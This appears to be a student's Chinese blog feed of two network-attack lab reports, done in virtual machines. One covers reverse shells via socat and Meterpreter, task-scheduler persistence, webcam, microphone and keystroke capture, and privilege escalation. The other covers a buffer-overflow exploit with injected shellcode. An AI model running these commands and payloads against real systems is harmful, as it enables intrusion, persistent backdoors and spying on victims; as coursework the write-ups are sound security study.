<p>想要在之后windows启动后就能获得其控制，便需要我们配置<strong>任务计划启动</strong>，使windows每隔一段时间就进行反弹连接</p><p>1.在”Windows-&gt;控制面板-&gt;管理工具-&gt;任务计划程序“中新建任务计划</p><p>配置触发器为工作站锁定时</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323155827943.png" alt="image-20240323155827943"  data-is-external-image="true"></figure><p>2.操作设置为：</p><p>启动程序<code>C:\Users\lenovo\Desktop\socat-win10-main\socat.exe</code></p><p>添加参数<code>TCP:192.168.255.137:4325 EXEC:&#39;cmd.exe&#39;,pty,stderr,setsid,sigint,sane</code></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323155853377.png" alt="image-20240323155853377"  data-is-external-image="true"></figure><p>3.在linux端开启监听</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre>
<p>4.锁定win界面后触发，linux获得win shell并执行之前输入的systeminfo命令</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323155930342.png" alt="image-20240323155930342"  data-is-external-image="true"></figure><h3 id="23使用msf-meterpreter（或其他软件）生成可执行文件，利用ncat或socat传送到主机并运行获取主机shell">2.3使用MSF meterpreter（或其他软件）生成可执行文件，利用ncat或socat传送到主机并运行获取主机Shell</h3>
<pre><code class="language-shell">192.168.255.137
</code></pre>
<p>1.生成后门软件</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_20214325.exe
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171348784.png" alt="image-20240323171348784"  data-is-external-image="true"></figure><p>2.打开监听进程</p><pre><code class="language-shell">msfconsole
</code></pre>
<pre><code class="language-shell">use exploit/multi/handler
</code></pre>
<pre><code class="language-shell">set payload windows/meterpreter/reverse_tcp
</code></pre>
<pre><code class="language-shell">set LHOST 192.168.255.137
</code></pre>
<pre><code class="language-shell">set LPORT 4325
</code></pre>
<pre><code class="language-shell"> show options
</code></pre>
<pre><code class="language-shell">run
</code></pre>
<p>成功获取</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171214418.png" alt="image-20240323171214418"  data-is-external-image="true"></figure><h3 id="24使用msf-meterpreter（或其他软件）生成获取目标主机音频、摄像头、击键记录等内容，并尝试提权">2.4使用MSF meterpreter（或其他软件）生成获取目标主机音频、摄像头、击键记录等内容，并尝试提权</h3>
<p>1.获取音频</p><pre><code class="language-shell">record_mic
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171656121.png" alt="image-20240323171656121"  data-is-external-image="true"></figure><p>2.获取屏幕截图</p><pre><code class="language-shell">screenshot
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171534468.png" alt="image-20240323171534468"  data-is-external-image="true"></figure><p>3.摄像头拍照</p><pre><code class="language-shell">webcam_snap
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323171908972.png" alt="image-20240323171908972"  data-is-external-image="true"></figure><p>4.键盘记录</p><p>开始记录</p><pre><code class="language-shell">keyscan_start
</code></pre>
<p>一段时间后导出记录</p><pre><code class="language-shell">keyscan_dump
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323172157525.png" alt="image-20240323172157525"  data-is-external-image="true"></figure><p>5.提权</p><p>1.以管理员身份运行后门软件</p><p>2.查看当前身份</p><pre><code class="language-shell">getuid
</code></pre>
<p>3.提权</p><pre><code class="language-shell">getsystem
</code></pre>
<p>再次查看身份发现提权成功</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323172920474.png" alt="image-20240323172920474"  data-is-external-image="true"></figure><h3 id="25可选加分内容：使用msf生成shellcode注入到实践1中的pwn1中，获取反弹连接shell">2.5可选加分内容：使用MSF生成shellcode,注入到实践1中的pwn1中，获取反弹连接Shell</h3>
<p>使用msf生成shellcode并注入到pwn20214325中</p><pre><code class="language-shell">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -x pwn20214325 -f elf &gt; pwn20214325_with_backdoor
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014137497.png" alt="image-20240326014137497"  data-is-external-image="true"></figure><p>打开msfconsole并设置载荷、监听IP和端口</p><pre><code class="language-shell">msfconsole
</code></pre>
<pre><code class="language-shell">use exploit/multi/handler
</code></pre>
<pre><code>set payload linux/x86/meterpreter/reverse_tcp
</code></pre>
<pre><code class="language-shell">set LHOST 192.168.255.137
</code></pre>
<pre><code class="language-shell">set LPORT 4325
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014227214.png" alt="image-20240326014227214"  data-is-external-image="true"></figure><p>开始监听</p><pre><code class="language-shell">run
</code></pre>
<p>在靶机端执行后面软件pwn20214325_with_backdoor后攻击成功</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014433268.png" alt="image-20240326014433268"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014459958.png" alt="image-20240326014459958"  data-is-external-image="true"></figure><p>使用mkdir在靶机上创建文件夹attack</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014610661.png" alt="image-20240326014610661"  data-is-external-image="true"></figure><p>靶机桌面上出现了attack文件夹</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326014630668.png" alt="image-20240326014630668"  data-is-external-image="true"></figure><h2 id="3实验总结与体会">3实验总结与体会</h2>
<p>通过本次实验，我学会了如何使用msf进行后门软件生成和通过后门对靶机进行控制，也掌握了如何在渗透成功之后通过配置Cron或任务计划进行后门的维持，理解了反弹连接及其使用ncat和socat的实现方法。</p><p>在初步使用过msf之后我最大的感受就是对电脑安全的不信任，虽然实验是在关闭所有防火墙和杀毒软件之后完成的，但我相信只要进一步的学习相关知识就能轻松的突破一半家用防火墙和杀毒软件的防御实现真正的攻击，那时所有电脑上的个人隐私都将在攻击下被别人一览无余。也启示我们要在网络上谨防钓鱼攻击，遇到奇怪的网址和邮件等时都要小心点击，下载软件时也要尽量避免盗版软件，尽可能降低自己电脑被有害木马软件攻击勒索的可能性。</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>第1次实验-逆向与BOF基础</title>
        <author>
            <name>Ethan Chase</name>
        </author>
        <link href="https://Ethan-Chase.github.io/di-1ci-shi-yan-ni-xiang-yu-bofji-chu.html"/>
        <id>https://Ethan-Chase.github.io/di-1ci-shi-yan-ni-xiang-yu-bofji-chu.html</id>
            <category term="网络对抗"/>

        <updated>2024-04-08T15:54:08+08:00</updated>
            <summary></summary>
        <content type="html">
            <![CDATA[
                <h1 id="第1次实验-逆向与bof基础">第1次实验-逆向与BOF基础</h1>
<h2 id="0汇编基础">0汇编基础</h2>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
<th>机器码</th>
</tr>
</thead>
<tbody><tr>
<td>NOP</td>
<td>无操作</td>
<td>0x90</td>
</tr>
<tr>
<td>JNE (短跳转)</td>
<td>如果不相等则跳转</td>
<td>0x75 + 偏移量 (1字节)</td>
</tr>
<tr>
<td>JE (短跳转)</td>
<td>如果相等则跳转</td>
<td>0x74 + 偏移量 (1字节)</td>
</tr>
<tr>
<td>JMP (短跳转)</td>
<td>无条件跳转</td>
<td>0xEB + 偏移量 (1字节)</td>
</tr>
<tr>
<td>CMP (AL, imm8)</td>
<td>比较AL寄存器与一个8位立即数</td>
<td>0x3C + 立即数值 (1字节)</td>
</tr>
</tbody></table>
<h2 id="1手工修改可执行文件，改变程序执行流程，直接跳转到getshell函数。">1手工修改可执行文件，改变程序执行流程，直接跳转到getShell函数。</h2>
<h3 id="11下载pwn1文件并通过共享文件夹放入虚拟机">1.1下载pwn1文件并通过共享文件夹放入虚拟机</h3>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317152356515.png" alt="image-20240317152356515"  data-is-external-image="true"></figure><p>将pwn1改名为pwn20214325</p><pre><code class="language-shell">mv pwn1 pwn20214325
</code></pre>
<h3 id="12通过objdump对pwn20214325进行反汇编">1.2通过objdump对pwn20214325进行反汇编</h3>
<pre><code class="language-shell">objdump -d pwn20214325 | more
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317154755853.png" alt="image-20240317154755853"  data-is-external-image="true"></figure><h3 id="13根据显示计算执行getshell对应的机器指令">1.3根据显示计算执行getshell对应的机器指令</h3>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317155518694.png" alt="image-20240317155518694"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317155607307.png" alt="image-20240317155607307"  data-is-external-image="true"></figure><h3 id="14计算call地址">1.4计算call地址</h3>
<p>804 847D-804 84BA=FFFF FFC3，因此设法将e8 d7 ff ff ff改为e8 c3 ff ff ff即可</p><h3 id="15修改call地址">1.5修改call地址</h3>
<p>使用wxHexEditor打开pwnpwn20214325_2并搜索找到e8 d7 ff ff ff</p><pre><code class="language-shell">wxHexEditor
</code></pre>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317221755728.png" alt="image-20240317221755728"  data-is-external-image="true"></figure><p>将e8 d7 ff ff ff改为e8 c3 ff ff ff</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317221822849.png" alt="image-20240317221822849"  data-is-external-image="true"></figure><p>保存并重新通过反汇编查看pwn20214325_2，确定call指令正确调用了getShell</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317160529642.png" alt="image-20240317160529642"  data-is-external-image="true"></figure><h3 id="16攻击结果">1.6攻击结果</h3>
<pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ ./pwn20214325_2 
$ ls
input  pwn20214325  pwn20214325_2
$ cd ..
$ ls
exp1
</code></pre>
<p>运行后成功得到了shell提示符</p><h2 id="2利用foo函数的bof漏洞，构造一个攻击输入字符串，覆盖返回地址，触发getshell函数。">2利用foo函数的Bof漏洞，构造一个攻击输入字符串，覆盖返回地址，触发getShell函数。</h2>
<h3 id="21分析函数漏洞">2.1分析函数漏洞</h3>
<p>使用objdump反汇编pwn20214325并对foo函数进行分析</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317154755853.png" alt="image-20240317154755853"  data-is-external-image="true"></figure><pre><code>; 函数foo的开始
08048491 &lt;foo&gt;:
; 将基指针寄存器（ebp）的值压入栈中，用于保存上一个函数栈帧的基指针
 8048491:	55                   	push   %ebp
; 将栈指针（esp）的值复制到基指针（ebp），设置当前函数的栈帧基点
 8048492:	89 e5                	mov    %esp,%ebp
; 从栈指针（esp）减去56字节，为局部变量和调用的函数预留空间
 8048494:	83 ec 38             	sub    $0x38,%esp
; 将ebp寄存器减去28后的地址加载到eax寄存器，用于定位某个局部变量的地址
 8048497:	8d 45 e4             	lea    -0x1c(%ebp),%eax
; 将eax寄存器的值（一个地址）放置到栈顶，作为下一条call指令的参数
 804849a:	89 04 24             	mov    %eax,(%esp)
; 调用gets函数，从标准输入读取一行文本到之前准备的地址处。注意：使用gets存在安全风险
 804849d:	e8 8e fe ff ff       	call   8048330 &lt;gets@plt&gt;
; 再次获取同一局部变量的地址，用于下一个函数调用的参数
 80484a2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
; 将地址再次放置到栈顶
 80484a5:	89 04 24             	mov    %eax,(%esp)
; 调用puts函数，打印出之前gets函数读取的字符串
 80484a8:	e8 93 fe ff ff       	call   8048340 &lt;puts@plt&gt;
; 恢复ebp寄存器的值到esp，撤销栈空间的分配，并将之前保存的ebp值弹回ebp寄存器
 80484ad:	c9                   	leave  
; 从函数返回，弹出之前调用函数时压入栈的返回地址并跳转过去
 80484ae:	c3                   	ret    
</code></pre>
<h3 id="22确定缓冲区溢出位置">2.2确定缓冲区溢出位置</h3>
<p>使用gdb对pwn20214325进行调试，输入111112222233333444445555566666777778888899999</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317163952446.png" alt="image-20240317163952446"  data-is-external-image="true"></figure><p>发现EIP中的值被覆盖为<strong>7778</strong>。因此，重新构造输入，将7778（38373737）更改为getShell对应的0804 847D即可</p><p>将11111222223333344444555556666677<strong>7778</strong>888899999改为：</p><p>11111222223333344444555556666677**\x7d\x84\x04\x08**再次输入即可</p><h3 id="23构造攻击输入">2.3构造攻击输入</h3>
<p>但由于无法通过键盘输入\x7d\x84\x04\x08，因此需要构造包含对应字符串的文件：</p><pre><code class="language-shell">echo &quot;11111222223333344444555556666677\x7d\x84\x04\x08&quot; &gt; input20214325
</code></pre>
<p>使用16进制查看指令xxd查看input文件的内容是否如预期</p><pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ xxd input
00000000: 3131 3131 3132 3232 3232 3333 3333 3334  1111122222333334
00000010: 3434 3434 3535 3535 3536 3636 3636 3737  4444555556666677
00000020: 7d84 0408 0a  
</code></pre>
<h3 id="24攻击结果">2.4攻击结果</h3>
<p>将input的输入，通过管道符“|”，作为pwn20214325的输入</p><pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ (cat input20214325; cat) | ./pwn20214325
11111222223333344444555556666677}�
ls
input  input20214325  pwn20214325  pwn20214325_2
cd ..
ls
exp1
</code></pre>
<p>运行后成功，得到控制权限</p><h2 id="3注入一个自己制作的shellcode并运行这段shellcode。">3注入一个自己制作的shellcode并运行这段shellcode。</h2>
<h3 id="31提前准备">3.1提前准备</h3>
<h4 id="311关闭堆栈保护">3.1.1关闭堆栈保护</h4>
<p>编译时添加</p><pre><code class="language-shell">-fno-stack-protector
</code></pre>
<p>例如：</p><pre><code class="language-shell">gcc cat_shadow.c -o cat_shadow -fno-stack-protector -z execstack -w
</code></pre>
<h4 id="312关闭堆栈执行保护">3.1.2关闭堆栈执行保护</h4>
<p>设置堆栈可执行</p><pre><code class="language-shell">execstack -s pwn20214325
</code></pre>
<p>查询文件的堆栈是否可执行</p><pre><code class="language-shell">execstack -q pwn20214325
</code></pre>
<h5 id="遇到问题：未找到execstack命令">遇到问题：未找到execstack命令</h5>
<pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ execstack -s pwn20214325           
execstack: command not found
</code></pre>
<p>尝试安装失败</p><pre><code class="language-shell">┌──(root㉿jyc20214325)-[/home/kali/Desktop/ShareFolder/exp1]
└─# apt install execstack                    
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
E: Unable to locate package execstack
</code></pre>
<p>解决办法</p><pre><code class="language-shell">sudo vim /etc/apt/sources.list
</code></pre>
<p>添加以下内容</p><pre><code class="language-shell">deb http://http.kali.org/kali kali-rolling main contrib non-free
deb http://http.kali.org/kali sana main non-free contrib
deb http://security.kali.org/kali-security sana/updates main contrib non-free
deb http://old.kali.org/kali moto main non-free contrib
</code></pre>
<p>保存退出后更新</p><pre><code class="language-shell">sudo apt-get update
</code></pre>
<p>安装成功</p><pre><code class="language-shell">┌──(root㉿jyc20214325)-[/home/kali/Desktop/ShareFolder/exp1]
└─# whereis execstack        
execstack: /usr/sbin/execstack /usr/share/man/man8/execstack.8.gz
</code></pre>
<h4 id="313关闭地址随机化">3.1.3关闭地址随机化</h4>
<p>查看地址随机化设置</p><pre><code class="language-shell">more /proc/sys/kernel/randomize_va_space
</code></pre>
<p>该文件的值可以是以下之一：</p><ul>
<li><code>0</code>：关闭地址空间随机化。在这种情况下，内存布局是固定的，不会进行随机化。这可能会增加系统的易受攻击性。</li>
<li><code>1</code>：启用地址空间随机化，但只对动态链接库进行随机化。这是一种中等级别的随机化，可以提高系统的安全性，并且不太可能导致兼容性问题。</li>
<li><code>2</code>：完全启用地址空间随机化，包括堆栈、内存映射和动态链接库。这是最高级别的随机化，提供最大的安全性，但可能导致一些应用程序或服务的兼容性问题。</li>
</ul>
<p>关闭地址随机化</p><pre><code class="language-shell">echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space 
</code></pre>
<h3 id="32准备shellcode">3.2准备Shellcode</h3>
<p>以实验指导给出的shellcode为例。如下：</p><pre><code class="language-shell">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\
</code></pre>
<h3 id="33注入shellcode">3.3注入Shellcode</h3>
<h4 id="33-1方法一：retaddrnopshellcode">3.3-1方法一：retaddr+nop+shellcode</h4>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317224736200.png" alt="image-20240317224736200"  data-is-external-image="true"></figure><h5 id="33-11构造要注入的payload">3.3-1.1构造要注入的payload</h5>
<pre><code class="language-shell">perl -e &#39;print &quot;\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x90\x4\x3\x2\x1\x00&quot;&#39; &gt; input_shellcode_20214325
</code></pre>
<h5 id="33-12确定x4x3x2x1处应填写的地址">3.3-1.2确定\x4\x3\x2\x1处应填写的地址</h5>
<p>打开一个终端注入攻击buf：</p><pre><code class="language-shell">(cat input_shellcode_20214325;cat) | ./pwn20214325
</code></pre>
<p>3.3-1.3查看pwn20214325进程号</p><pre><code class="language-shell">ps aux | grep pwn20214325
</code></pre>
<p>output:</p><pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ ps aux | grep pwn20214325
kali      178029  0.0  0.0   2732   896 pts/0    S+   10:34   0:00 ./pwn20214325
kali      178165  0.0  0.1   6344  2176 pts/2    S+   10:34   0:00 grep --color=auto pwn20214325
</code></pre>
<p>3.3-1.4打开另一个终端使用gdb调试</p><p>1启动gdb调试这个进程</p><pre><code class="language-shell">attach 503353
</code></pre>
<p>2查看函数 <code>foo</code> 的反汇编代码</p><pre><code class="language-shell">disassemble foo
</code></pre>
<p>3在ret处设置断点</p><pre><code class="language-shell">break *0x080484ae
</code></pre>
<p>4在另外一个终端中按下回车，gdb输入</p><pre><code class="language-shell">c
</code></pre>
<p>5查看esp中内容</p><pre><code class="language-shell">info r esp
</code></pre>
<p>6查看esp指向地址</p><pre><code class="language-shell">x/16x 0xffffcfdc
</code></pre>
<p>7在0xffffcfac找到01020304，往前找shellcode起始位置</p><pre><code class="language-shell">x/16x 0xffffcfbc
</code></pre>
<p>8看到从0xffffcf8c开始为构造的nop滑行区域，将返回值改为<code>0xffffcfbc</code></p><pre><code class="language-shell">perl -e &#39;print &quot;\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x90\xbc\xcf\xff\xff\x00&quot;&#39; &gt; input_shellcode_20214325
</code></pre>
<h5 id=""></h5>
<p>完整操作过程</p><pre><code class="language-shell">(gdb) attach 503353
Attaching to process 503353
Reading symbols from /home/kali/Desktop/ShareFolder/exp1/pwn20214325...
(No debugging symbols found in /home/kali/Desktop/ShareFolder/exp1/pwn20214325)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
0xf7fc8579 in __kernel_vsyscall ()
(gdb) disassemble foo
Dump of assembler code for function foo:
   0x08048491 &lt;+0&gt;:     push   %ebp
   0x08048492 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048494 &lt;+3&gt;:     sub    $0x38,%esp
   0x08048497 &lt;+6&gt;:     lea    -0x1c(%ebp),%eax
   0x0804849a &lt;+9&gt;:     mov    %eax,(%esp)
   0x0804849d &lt;+12&gt;:    call   0x8048330 &lt;gets@plt&gt;
   0x080484a2 &lt;+17&gt;:    lea    -0x1c(%ebp),%eax
   0x080484a5 &lt;+20&gt;:    mov    %eax,(%esp)
   0x080484a8 &lt;+23&gt;:    call   0x8048340 &lt;puts@plt&gt;
   0x080484ad &lt;+28&gt;:    leave
   0x080484ae &lt;+29&gt;:    ret
End of assembler dump.
(gdb) break *0x080484ae
Breakpoint 1 at 0x80484ae
(gdb) c
Continuing.

Breakpoint 1, 0x080484ae in foo ()
(gdb) info r esp
esp            0xffffcfdc          0xffffcfdc
(gdb) x/16x 0xffffcfdc
0xffffcfdc:     0xffffcf8c      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
0xffffcffc:     0xffffd010      0xf7e1dff4      0x080484af      0x00000001
0xffffd00c:     0xffffd0a4      0xf7e1dff4      0x080484d0      0xf7ffcba0
(gdb) x/16x 0xffffcfac
0xffffcfac:     0x00000000      0x00000000      0x00000000      0x00000013
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcf8c      0x00000000      0x00000000      0x00000000
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcf8c      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
</code></pre>
<h5 id="33-13尝试攻击">3.3-1.3尝试攻击</h5>
<pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ (cat input_shellcode_20214325; cat) | ./pwn20214325

������1�Ph//shh/bin��PS��1Ұ
                           �����

zsh: broken pipe         ( cat input_shellcode_20214325; cat; ) | 
zsh: segmentation fault  ./pwn20214325
</code></pre>
<p>攻击失败</p><h5 id="33-14分析失败原因"><span id='jump'>3.3-1.4分析失败原因</span></h5>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240318184927159.png" alt="image-20240318184927159"  data-is-external-image="true"></figure><p>通过<code>si</code>逐步调试程序并对照shellcode查看内存，发现在操作后由于esp位置错误，在执行shellcode中push操作时将shellcode本身覆盖导致错误</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/%E5%9B%BE%E7%89%871.png" alt="图片1"  data-is-external-image="true"></figure><p>完整操作</p><pre><code class="language-shell">(gdb) attach 505897
Attaching to program: /home/kali/Desktop/ShareFolder/exp1/pwn20214325, process 505897
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

Program stopped.
0xf7fc8579 in __kernel_vsyscall ()
(gdb) break *0x080484ae
Note: breakpoint 1 also set at pc 0x80484ae.
Breakpoint 2 at 0x80484ae
(gdb) c
Continuing.

Breakpoint 1, 0x080484ae in foo ()
(gdb) info r esp
esp            0xffffcfdc          0xffffcfdc
(gdb) x/16x 0xffffcfdc
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
0xffffcffc:     0xffffd010      0xf7e1dff4      0x080484af      0x00000001
0xffffd00c:     0xffffd0a4      0xf7e1dff4      0x080484d0      0xf7ffcba0
(gdb) x/16x 0xffffcfac
0xffffcfac:     0x00000000      0x00000000      0x00000000      0x00000013
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfbc in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfbd in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfbe in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfbf in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfc0 in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfc1 in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfc2 in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfc4 in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0xffffcfbc      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfc5 in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfca in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0xb0d231e1      0x68732f2f
0xffffcfdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfcf in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0x6e69622f      0x68732f2f
0xffffcfdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfd1 in ?? ()
